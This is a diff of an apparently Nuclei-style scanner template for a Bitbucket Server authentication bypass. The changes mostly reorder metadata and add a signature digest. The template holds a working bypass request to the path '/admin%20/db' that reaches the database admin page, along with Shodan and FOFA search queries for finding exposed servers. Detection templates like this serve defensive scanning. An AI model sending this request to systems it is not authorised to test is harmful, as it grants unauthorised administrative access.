@@ -1,5 +1,4 @@
 id: bitbucket-auth-bypass
-
 info:
   name: Bitbucket Server > 4.8 - Authentication Bypass
   author: DhiyaneshDk
@@ -11,19 +10,17 @@ info:
   classification:
     cpe: cpe:2.3:a:atlassian:bitbucket_data_center:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: title="Log in - Bitbucket"
     max-request: 1
-    vendor: atlassian
     product: bitbucket_data_center
     shodan-query: title:"Log in - Bitbucket"
-    fofa-query: title="Log in - Bitbucket"
-  tags: misconfig,atlassian,bitbucket,auth-bypass,vuln
-
+    vendor: atlassian
+    verified: true
+  tags: atlassian,auth-bypass,bitbucket,misconfig,vuln
 http:
   - method: GET
     path:
       - "{{BaseURL}}/admin%20/db"
-
     matchers-condition: and
     matchers:
       - type: word
@@ -32,8 +29,7 @@ http:
           - "<h2>Database</h2>"
           - "Migrate database"
         condition: and
-
       - type: status
         status:
           - 200
-
+        # digest: 4a0a0047304502204e9635c6909f20bf6dea8018dff138eec63ac27563e921272af5995a965b3f83022100d122443d9558ccf631261bb180f6e4c826fb94bcd2e4021601a0987c9ec5619a:922c64590222798bb761d5b6d8e72950
